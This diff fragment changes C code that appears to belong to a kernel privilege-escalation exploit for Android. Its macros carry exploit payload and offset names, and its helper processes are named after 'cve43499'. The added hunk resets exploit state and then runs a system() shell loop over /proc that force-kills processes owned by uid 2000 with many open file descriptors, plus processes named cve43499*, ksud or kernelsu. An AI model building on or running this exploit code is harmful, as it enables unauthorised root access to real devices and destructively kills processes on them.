@@ -161,7 +161,24 @@ __attribute__((constructor)) static void load(void) {
 
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     int delay_usec = attempt_delay_usec(base_delay, attempt);
-    pid_t child = SYSCHK(fork());
+#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+    /* v45-attempt-reset */
+    atomic_store(&app_p0_state->writer_started, 0);
+    /* Release pipe pages held by orphans from the previous attempt.
+     * Two classes: any uid-2000 process with >100 fds (leaked shells);
+     * and any process whose comm starts with cve43499 (the p0 ref
+     * keeper and its helpers). */
+    system("for p in /proc/[0-9]*; do "
+           "  u=$(stat -c '%u' $p 2>/dev/null); "
+           "  [ \"$u\" != \"2000\" ] && continue; "
+           "  comm=$(cat $p/comm 2>/dev/null); "
+           "  n=$(ls $p/fd 2>/dev/null | wc -l); "
+           "  case \"$comm\" in cve43499*|ksud|kernelsu) "
+           "    kill -9 $(basename $p) 2>/dev/null; continue;; esac; "
+           "  [ \"$n\" -gt 100 ] && kill -9 $(basename $p) 2>/dev/null; "
+           "done 2>/dev/null");
+#endif
+        pid_t child = SYSCHK(fork());
     if (child == 0) {
       SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
       if (getppid() == 1) {
